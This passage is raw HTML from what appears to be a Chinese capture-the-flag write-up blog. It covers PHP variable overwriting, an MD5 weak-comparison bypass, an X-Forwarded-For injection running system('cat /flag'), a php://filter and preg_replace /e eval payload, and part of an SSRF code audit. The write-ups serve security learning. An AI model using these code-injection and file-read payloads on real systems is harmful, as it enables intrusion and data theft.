class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>如果想打印flag，有两种方法，一种是将exit()里面的变量变成$flag【$yds=$flag】；还有一种就是之前一直不改变$flag的值，同时绕过三个if，最后输出flag。</p>
-<p>对三个if语句分析一下，发现在最后输出flag是不可能的。</p>
-<p>有三个exit，那么就有理论上就有三种方法。</p>
-<ol>
-<li>$handsome=$flag：要求GET传flag参数，由<code>$$x = $$y</code>知只可传flag=flag才不会改变flag的值，可这样却又无法通过if绕过，故不可。</li>
-<li>$yds：?yds=flag可通过第二个if并且输出flag</li>
-<li>$is：?flag=flag&amp;is=flag可通过第三个if并且输出is</li>
-</ol>
-<h2 id="变量覆盖四种情况"><a href="#变量覆盖四种情况" class="headerlink" title="变量覆盖四种情况"></a>变量覆盖四种情况</h2><h3 id="第一种：如上题所示，出现类似于-x-y的语句"><a href="#第一种：如上题所示，出现类似于-x-y的语句" class="headerlink" title="第一种：如上题所示，出现类似于$$x = $$y的语句"></a>第一种：如上题所示，出现类似于<code>$$x = $$y</code>的语句</h3><h3 id="第二种：extract-函数使用不当【extract参数未设置】"><a href="#第二种：extract-函数使用不当【extract参数未设置】" class="headerlink" title="第二种：extract()函数使用不当【extract参数未设置】"></a>第二种：extract()函数使用不当【extract参数未设置】</h3><p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/5-1.png" alt="5-1"></p>
-<p>可以看到，如果第二个变量没有取好或者没有设置第二个参数就会存在变量覆盖。</p>
-<p>例子：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; 1;    &#x2F;&#x2F;原变量值为1</span><br><span class="line">$b &#x3D; array(&#39;a&#39; &#x3D;&gt; &#39;3&#39;);</span><br><span class="line">extract($b);    &#x2F;&#x2F;经过extract()函数对$b处理后</span><br><span class="line">echo $a;    &#x2F;&#x2F;输出结果为3</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>例题：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;extract($_GET);</span><br><span class="line">if(isset($bdctf))</span><br><span class="line">&#123;</span><br><span class="line">$content&#x3D;trim(file_get_contents($flag));&#x2F;&#x2F;file_get_contents—将整个文件读入一个字符串</span><br><span class="line">if($bdctf&#x3D;&#x3D;$content)                             &#x2F;&#x2F;trim—去除字符串首尾处的空白字符（或者其他字符）</span><br><span class="line">&#123; echo&#39;bdctf&#123;**********&#125;&#39;; &#125;</span><br><span class="line">else</span><br><span class="line">&#123; echo&#39;这不是蓝盾的密码啊&#39;; &#125;</span><br><span class="line">&#125;&quot;</span><br></pre></td></tr></table></figure>
-
-<p>为了达到$bdctf==$content，我们可以使两个值都为空：</p>
-<p><code>?bdctd=&amp;flag=</code> </p>
-<h3 id="第三种：parse-str-函数使用不当【magic-quotes-gpc未开启】"><a href="#第三种：parse-str-函数使用不当【magic-quotes-gpc未开启】" class="headerlink" title="第三种：parse_str()函数使用不当【magic_quotes_gpc未开启】"></a>第三种：parse_str()函数使用不当【magic_quotes_gpc未开启】</h3><p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/5-2.png" alt="5-2"></p>
-<p>例子：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; 1;                  &#x2F;&#x2F;原变量值为1</span><br><span class="line">parse_str(&#39;a&#x3D;2&#39;);   &#x2F;&#x2F;经过parse_str()函数后注册变量$a，重新赋值</span><br><span class="line">print_r($a);          &#x2F;&#x2F;输出结果为2</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>例题：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(</span><br><span class="line"><span class="keyword">empty</span>($_GET[<span class="string">'id'</span>])) &#123;                    <span class="comment">//empty()检查是否为空</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);            <span class="comment">//highlight_file—语法高亮一个文件</span></span><br><span class="line"><span class="keyword">die</span>();                                          <span class="comment">//等同于exit—输出一个消息并且退出当前脚本</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">include</span> (‘flag.php’);</span><br><span class="line">$a = “www.OPENCTF.com”;</span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@parse_str($id);</span><br><span class="line"><span class="keyword">if</span> ($a[<span class="number">0</span>] != ‘QNKCDZO’ &amp;&amp; md5($a[<span class="number">0</span>]) == md5(‘QNKCDZO’)) &#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">exit</span>(‘其实很简单其实并不难！’);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>md5(‘QNKCDZO’)得到0e830400451993494058024219903391，由于==弱比较，只要找到一个md5加密后以0e开头的就OK了。</p>
-<p><code>?id=a[0]=s878926199a</code></p>
-<h3 id="第四种情况：import-request-variables-使用不当【register-globals被禁止】"><a href="#第四种情况：import-request-variables-使用不当【register-globals被禁止】" class="headerlink" title="第四种情况：import_request_variables()使用不当【register_globals被禁止】"></a>第四种情况：import_request_variables()使用不当【register_globals被禁止】</h3><p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/5-3.png" alt="5-3"></p>
-<p>例子：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $auth=<span class="string">'0'</span>;</span><br><span class="line">    import_request_variables(<span class="string">'G'</span>);</span><br><span class="line">    <span class="keyword">if</span>($auth== <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"private!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">"public!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>?auth=1</code>时，输出private</p>
-<h1 id="BJDCTF2020-The-mystery-of-ip【XFF-client-ip】"><a href="#BJDCTF2020-The-mystery-of-ip【XFF-client-ip】" class="headerlink" title="[BJDCTF2020]The mystery of ip【XFF/client-ip】"></a>[BJDCTF2020]The mystery of ip【XFF/client-ip】</h1><p>这题唯一的知识点就是：</p>
-<p><code>X-FORWARDED-FOR</code>，<code>client-ip</code></p>
-<p>可以伪造ip，在flag.php抓个包，加个字段就OK了</p>
-<p>然后加大括号发现里面可以进行运算</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-FORWARDED-FOR：&#123;1+2&#125;			&#x2F;&#x2F;3</span><br><span class="line">X-FORWARDED-FOR：&#123;system(&#39;ls&#39;)&#125;   &#x2F;&#x2F;成功</span><br><span class="line">X-FORWARDED-FOR：&#123;system(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-<h1 id="BJDCTF2020-ZJCTF，不过如此【正则表达式-eval】"><a href="#BJDCTF2020-ZJCTF，不过如此【正则表达式-eval】" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此【正则表达式/eval】"></a>[BJDCTF2020]ZJCTF，不过如此【正则表达式/eval】</h1><p>打开网页先发现源代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>其中</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span></span><br></pre></td></tr></table></figure>
-
-<p>这里可以用两种方法绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一种：</span><br><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have dream</span><br><span class="line"></span><br><span class="line">第二种：</span><br><span class="line">?text&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">POST内容：</span><br><span class="line">I have a dream</span><br></pre></td></tr></table></figure>
-
-<p>绕过以后包含next.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br></pre></td></tr></table></figure>
-
-<p>解码之后得到</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(</span><br><span class="line">            <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">            <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">            $str</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><code>preg_replace(&#39;/xxx/e&#39;,para2,para3)</code>，e代表会执行para2，而<code>\1</code>代表匹配正则表达式括号里匹配到的第一个参数。</p>
-<blockquote>
-<p><strong>反向引用</strong></p>
-<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong>中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
-</blockquote>
-<p>这里我们可以</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?.*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
-
-<p>但是我本地测试了一下：发现<code>.</code>点开头是不合法的命名，于是php自动改成了<code>_</code>下划线</p>
-<p><img src="/2020/08/02/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/6-1.png" alt="6-1"></p>
-<p>所以想到正则表达式可以这样构造</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*&#x3D;$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>
-
-<p>页面上成功显示phpinfo()，于是可以构造：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?\S*&#x3D;$&#123;eval($_POST[ag])&#125;</span><br><span class="line">POST数据：</span><br><span class="line">ag&#x3D;system(&#39;cat &#x2F;flag&#39;)</span><br></pre></td></tr></table></figure>
-
-<p>或者根据源码里的函数构造：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*&#x3D;$&#123;getFlag()&#125;&amp;cmd&#x3D;system(&#39;cat &#x2F;flag&#39;)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-<h1 id="De1CTF-2019-SSRF-Me【python代码审计】"><a href="#De1CTF-2019-SSRF-Me【python代码审计】" class="headerlink" title="[De1CTF 2019]SSRF Me【python代码审计】"></a>[De1CTF 2019]SSRF Me【python代码审计】</h1><p>先看源代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="comment">#_init_初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个if：如果checkSign(self) 返回 True ，则进入下一个if</span></span><br><span class="line"><span class="comment">#审计checkSign(self)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line"><span class="comment">#如果scan在action里面，则我们可以让param进入scan这个函数，并的目录下创建一个result.txt</span></span><br><span class="line"><span class="comment">#然后通过scan()函数把名字为param的网址里的内容写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="comment">#如果read在action里面，则我们可以读取读取result.txt的内容赋值给result</span></span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action,self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#如果getSign(self.action, self.param)和self.sign相等则返回True ,否则返回False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment">#提取get方法传入的，参数名叫param对应得值，并将其url编码后赋值给param</span></span><br><span class="line"><span class="comment">#将scan赋值给action</span></span><br><span class="line"><span class="comment">#审计 getSign()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="comment">#以get方法传入param参数值，在cookie里面传递action和sign的值</span></span><br><span class="line"><span class="comment">#使param绕过waf，审计waf</span></span><br><span class="line"><span class="comment">#用我们传进去的 action 、 param  、sign  、ip 这四个参数构造一个Task类对象，并且执行它的Exec方法</span></span><br><span class="line"><span class="comment">#审计Task</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment">#将secert_key 、param 、 action这三个值连接起来后进行md5加密，并将其作为十六进制数据字符串值返回</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#移除param头尾指定的字符(默认为空格或换行符)，并将param中中所有大写字符转化为小写</span></span><br><span class="line"><span class="comment">#若param以gopher或file为前缀，返回True,否者返回False</span></span><br><span class="line"><span class="comment">#回到challenge()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>下面给出审计过程：</p>
-<h2 id="De1ta"><a href="#De1ta" class="headerlink" title="/De1ta"></a>/De1ta</h2><h3 id="challenge-函数"><a href="#challenge-函数" class="headerlink" title="challenge()函数"></a>challenge()函数</h3><ol>
-<li>cookie获取action参数</li>
-<li>get获取param参数</li>
-<li>cookie获取sign参数</li>
-<li>正常获取ip</li>
-</ol>
-<p>先绕过waf(param)，然后创建Task(action,param,sign,ip)，然后执行Task对象里的Exec()方法。</p>
-<h3 id="waf-param"><a href="#waf-param" class="headerlink" title="waf(param)"></a>waf(param)</h3><p>param参数不能以gopher或者file开头。</p>
-<h3 id="Exec"><a href="#Exec" class="headerlink" title="Exec()"></a>Exec()</h3><p>先通过checkSIgn()，如果“scan”在action里，则…；如果“read”在action里，则…</p>
-<h4 id="checkSign"><a href="#checkSign" class="headerlink" title="checkSign()"></a>checkSign()</h4><p>如果getSign(action,param)的值等于sign，则通过。【相当于 md5(secret_key+param+action) == sign】</p>
-<h5 id="getSign"><a href="#getSign" class="headerlink" title="getSign()"></a>getSign()</h5><p>返回md5(secret_key+param+action).hexdigest()</p>
-<blockquote>
-<p>.hexdigest()后的格式就是我们正常在网上用工具加密的结果</p>
-</blockquote>
-<h5 id="如果“scan”在action"><a href="#如果“scan”在action" class="headerlink" title="如果“scan”在action"></a>如果“scan”在action</h5><p>那么就读取param1的数据并且写入到result.txt</p>
-<h5 id="如果“read”在action里"><a href="#如果“read”在action里" class="headerlink" title="如果“read”在action里"></a>如果“read”在action里</h5><p>那么就读取result.txt的内容，然后赋给返回值result</p>
-<h3 id="De1ta分析结果"><a href="#De1ta分析结果" class="headerlink" title="/De1ta分析结果"></a>/De1ta分析结果</h3><ol>
-<li>cookie获取action参数、get获取param参数、cookie获取sign参数</li>
